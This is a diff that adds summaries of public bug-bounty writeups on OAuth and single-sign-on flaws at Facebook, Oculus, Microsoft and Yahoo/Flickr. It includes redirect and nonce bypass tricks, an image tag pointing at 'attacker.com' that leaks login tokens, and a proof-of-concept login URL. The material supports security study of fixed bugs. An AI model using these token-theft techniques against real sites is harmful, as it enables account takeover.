@@ -249,6 +249,27 @@ Some specific topics about bug hunting.
 
 ### OAuth
 
+- [Hacking OAuth2.0 For Fun And Profit](https://drive.google.com/file/d/1Qw3hhValdRAWNGJtLbbFYfKtaevkw4fQ/view) by Pranav Hivarekar
+  - OAuth 2.0 basics:
+    - authorization code grant
+    - implicit grant
+  - Attacks on OAuth 2.0 integrations:
+    - token / code stealing - case study
+    - CSRF (missing `state` param) - case study
+    - token impersonation - case study
+- [Oauth 2.0 redirection bypass cheat sheet](http://nbsriharsha.blogspot.com/2016/04/oauth-20-redirection-bypass-cheat-sheet.html) by nbsriharsha
+  - The author gave a list of payloads used in `redirect_uri` (could try, but I don't think very useful).
+- [Stealing Facebook Access Tokens with a Double Submit](https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/) by Jack Whitton
+  - This was an old writeup and an unusual vulnerability.
+  - On the "Facebook App Center", we have links to numerous different apps. Some have a "Go to App" button, for apps embedded within Facebook, and others have "Visit Website" button, for sites which connect with Facebook.
+  - The "Visit Website" button submits a POST request to `ui_server.php`, which generates an "access token" and redirects you to the site.
+    - It doesn't present a permissions dialog like you would have when requesting permissions via `dialog/oauth`.
+    - This is presumably because the request has to be initiated by the user (due to the presence of a "CSRF token"), and because the permissions required are listed underneath the button.
+  - During testing, the author noticed that omitting the `fb_dstg` ("CSRF token") and `orig/new_perms` generates a 500 error and didn't redirect you. That was expected behaviour.
+  - However, in the background, an "access token" was generated. Refreshing the app's page in the "App Center" and hovering over "Visit Website" showed that it was a link to the site, with your "access token" included.
+    - `&tracks.com/?fb_source=appcenter&fb_appcenter=1#access_token=BAACXpcQtAc0BAJAZBRS85nuhcqskfz...`
+  - Using this bug, we can double-submi the permissions form to gain a valid "access token". The first request is discarded, the "token" is generated in the background. The second request is sent after a specific interval, which picks up the already generated "token" and redirects the user.
+  - The proc in this writeup is worth to study.
 - [Stealing Facebook Messenger Login Nonces worth 15k](https://stephensclafani.com/2017/03/21/stealing-messenger-com-login-nonces/) by Stephen Sclafani
   - The `messenger.com` website provides a "nonce" based login flow to allow a user who is already logged into their "Facebook account" to login to the site without having to re-enter their password.
     - It was possible to create a URL that when loaded by a user who was logged into their "Facebook account" would redirect a "nonce" for their account to another site.
@@ -289,6 +310,64 @@ Some specific topics about bug hunting.
     - In this URL the `#!/l.php` is appended to the `https://www.facebook.com/login/messenger_dot_com_iframe/` endpoint URL.
     - This worked because modern browsers preserve an appended hash through a "302 redirect", even across sites. A hash appended to `https://www.facebook.com/login/messenger_dot_com_iframe/` gets appended to `https://fb.beta.messenger.com/login/fb_iframe_target/` after the redirect.
     - To prevent this a site can append its own hash to its redirects, this hash will replace any hash that's been appended to the parent URL.
+- [Facebook: Bypass OAuth nonce and steal oculus response code](https://medium.com/@lokeshdlk77/bypass-oauth-nonce-and-steal-oculus-response-code-faa9cc8d0d37)
+  - Facebook made a "OAuth login feature" for "Oculus", that meant the user could directly login to "Oculus" using Facebook account, but there was a `nonce` parameter in the URL that the author never seen in any other OAuth flow. So he started to dig deeper on it.
+  - OAuth authorisation URL for "Facebook Oculus":
+    - Request: `https://www.facebook.com/v2.8/dialog/oauth?app_id=1517832211847102&client_id=1517832211847102&domain=auth.oculus.com&locale=en_GB&origin=1&redirect_uri=https://auth.oculus.com/login/&response_type=code&sdk=joey&version=v2.8&nonce=AXRr8eBAjDTBkzQ7&state=d916afa3-3dc1-bab7-fc9d-3c8f44bf757`
+    - Response: `https://auth.oculus.com/login/?code=AQDtxcP7I--AWqEvE-LjcPIjkimy7Z-oQHvLMtGNB8sdKSqhvvv5KFO1KNXgPw4nEewmFsOKsq1GIAcEqJq09rLHlsGQVBxq-HwqbvlE-_unfTayj2HdGp5GGEqsNLlK2zerCpKbBHbiDRW4tr7ZBnxcgebywDbd,lonbrqie5fdwjD-x6jsnI5wnZ4XaDIRMixFoRqtQSne406BwOo2nSVS2o1MmmXkLW_zaW5Vy0SW6&state=d916afa3-3dc1-bab8-fc9d-3c8f44bfe7b7#_=_`
+  - The `nonce` acted as "CSRF token" to prevent the user from CSRF attack, if the `nonce` value is not matched, the OAuth request would get aborted and did not follow the `redirect_uri`. So this OAuth flow had two challenges:
+    - Bypass `nonce`.
+    - Bypass `redirect_uri`.
+  - "CORS Proxy" is a free service for developers who need to bypass same-origin policy related to performing standard "AJAX requests" to 3rd party services (the author listed some online proxy servers).
+  - When the author passed the OAuth URL in the "CORS Proxy" server, it responded the source code of the given URL. When he searched for "nonce" in the source code, he saw that both of the "nonce" value in "real request" and using this "cors request" are same. So he bypassed the `nonce`.
+  - It's time to bypass `redirect_uri`. It made easy then he thought. The below URL redirected the response `code` to his app domain using "referer leakage":
+    - `https://auth.oculus.com/login/?redirect_uri=https://www.facebook.com/dialog/send?client_id=1933886253534366&next=https://www.whatismyreferer.com&from_post=1&error_ok=OK`
+  - Fixed: the leakage of "nonce" value in "CORS Proxy" and the `redirect_uri` in Oculus to Facebok was fixed.
+  - The poc in this writeup is worth to study.
+- [A tale about appengine.google.com authentication and life](https://proximasec.blogspot.com/2017/02/a-tale-about-appengines-authentication.html) by Andrey's Ramblings
+  - `appengine.google.com` used to have a site attached to it, but it's been shutdown in favor of "Google Cloud". Anyway, the only function that this subdomain has is to authenticate users on third party domains. Except for some reason one subdomain on Google itself. To summarize, here are the sites that use this authentication:
+    - Anything on `.withgoogle.com` domain, including the bug hunter dashboard.
+    - `enterprise.google.com`, which is some sort of administration panel for "Gsuite accounts" and even "Google Partners".
+    - `.appspot.com` sites, which are user generated.
+  - I don't understand this writeup.
+- [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/) by Jack Whitton
+  - Microsoft has various services spread across multiple domains: `*.outlook.com`, `*.live.com`, and so on. To handle authentication across these services, requests are made to `login.live.com`, `login.microsoftonline.com`, and `login.windows.net` to get a session for the user.
+    - User browsers to `https://outlook.office.com`.
+    - User is redirected to `https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563`.
+    - Provided that the user is logged in, a POST request is made back to the value of `wreply`, with the form field `t` containing a login "token" for the user.
+    - The service then consumes the "token", and logs the user in.
+  - Since the services are hosted on completely separate domains, and therefore cookies can't be used, the token is the only value needed to authenticate as a user. This is similar to how OAuth works.
+    - What this means is that if we can get the above code to POST the value of `t` to a server we control, we can impersonate the user.
+  - If we try and change the value of `wreply` to a non-Microsoft domain, such as `example.com`, we receive an error, and the request isn't processed.
+    - One fun trick to play around with is URL-encoding parameters multiple times. Occassionally this can be used to bypass different filters.
+  - The author uses `@example.com` to bypass URL filters, and redirects him to his own server.
+    - The syntax of a URL: `scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]`.
+  - Fixed: the hostname in `wreply` must end in `%2f`, which get URL-decoded to `/`, this ensures that the browser only sends the request to the intended host.
+- [Yahoo Bug Bounty: Chaining 3 Minor Issues To Takeover Flickr Accounts](https://mishresec.wordpress.com/2017/10/13/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/) by mishre
+  - "Flickr" is an image and video hosting website which is owned by Yahoo and resides on the `flickr.com` domain. To handle authentication on "Flickr", requests are made to `login.yahoo.com` to get an "access token" for the user.
+  - When a user wants to login to `flickr.com`, he clicks a "sign-in" button which redirects him to:
+    - `https://login.yahoo.com/config/login?.src=flickrsignin&.pc=8190&.scrumb=0&.pd=c%3DH6T9XcS72e4mRnW3NpTAiU8ZkA–&.intl=il&.lang=en&mg=1&.done=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Fvalidate%3F.src%3Dflickrsignin%26.pc%3D8190%26.scrumb%3D0%26.pd%3Dc%253DJvVF95K62e6PzdPu7MBv2V8-%26.intl%3Dil%26.done%3Dhttps%253A%252F%252Fwww.flickr.com%252Fsignin%252Fyahoo%252F%253Fredir%253Dhttps%25253A%25252F%25252Fwww.flickr.com%25252F`.
+    - This is the "Yahoo account login page" where a user is prompted to enter his credentials.
+  - After completing the login form and clicking login, the user is first redirected to a "Yahoo endpoint" where his credentials are verified and then, if they are valid, he is redirected back to:
+    - `https://www.flickr.com/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com%2F&.data={first-token-value}&.ys={second-token-value}`
+  - In the background "Flickr" verifies the `.ys` and `.data` parameters against the "Yahoo verification server" and logs the user in.
+  - If a user is already logged in to Yahoo and clicks the initial link, the flow just happens in the background without the need for a user to enter his credentials in Yahoo.
+    - This poses a higher risk of account takeover, due to the fact that the user just needs to click a single link (like in some "OAuth implementations") for the authentication to happen for him.
+  - The first thing the author have noticed was that the second `.done` parameter can be manipulated. This parameter actually controled where the "login tokens" are sent. It appeared that Yahoo's servers only verify that it starts with `https://www.flickr.com/signin/yahoo/`, but we could still append `../`. So if we append `../../test` to the `.done` original value, the `.ys` and `.data` tokens would be sent to `https://www.flickr.com/test` endpoint.
+    - This gave us a lead since if we found an "open redirect" somewhere on the `https://www.flickr.com/`, we would be able to send the "token" to our own server.
+  - After some digging, the author came across `https://www.flickr.com/html.gne?tighten=0&type=comment`, which states that images can be embedded in the comments on different Flickr pages. He thought that maybe if he could post an external image in a comment, the "tokens" would be leaked to his own server via the "referrer filed".
+    - Posted a comment on his own uploaded image: `<img src="https://attacker.com/someimage.jpg"&gt;`.
+    - The image was really embeded in the comment, but unfortunately Yahoo were manipulating its `src` value to: `https://ec.yimg.com/ec?url=https://attacker.com/someimage.jpg&t=1491136241&sig=FGQiNHDOtEj7LQDBbYBnwA–~C`
+    - That was actually an internal "Yahoo proxy" so that Flickr won't be leaking requests to external servers.
+    - It appeared that if he used some browser tricks he could manipulate the Flickr image processing logic. Posted the comment: `<img src="\/\/www.attacker.com/someimage.jpg" />`
+    - The comment was not manipulated by the proxy and the `src` value stayed as it was.
+    - The browser accepted this as a valid URL, but there was some "CSP" applied, the `img-src` configuration blocked the image, so the author wasn't actually able to embed external images after all.
+  - The author tried to look if there were other endpoints on Flickr that were also allowing comments. After some time, the came across the forums page: `https://www.flickr.com/help/forum/en-us/`. This page also supported the comments "html embedding feature", and more importantly it appeared that there was no "CSP" applied on all `https://www.flickr.com/help/forum/*` pages.
+  - So final poc URL: `https://login.yahoo.com/config/validate?.src=flickrsignin&.pc=8190&.scrumb=cLI6NPLejY6&.scrumb2=GszxN7PzUWX&.pd=c%3DJvVF95K62e6PzdPu7MBv2V8-&.intl=il&.done=https%3A%2F%2Fwww.flickr.com%2Fsignin%2Fyahoo%2F..%2F..%2Fhelp%2Fforum%2Fen-us%2F72157668446997150%2Fpage14%2F`.
+  - Resolution:
+    - The `.done` parameter on the `login.yahoo.com` endpoint only allows `https://www.flickr.com/signin/yahoo/`.
+    - The image embedding logic's bypass using `/\/\` is also fixed.
+    - There is now "CSP" applied on the "Flickr forum".
 
 ### JSON Web Token
 - [How I got access to millions of -redacted- accounts](https://bitquark.co.uk/blog/2016/02/09/how_i_got_access_to_millions_of_redacted_accounts) by Bitquark
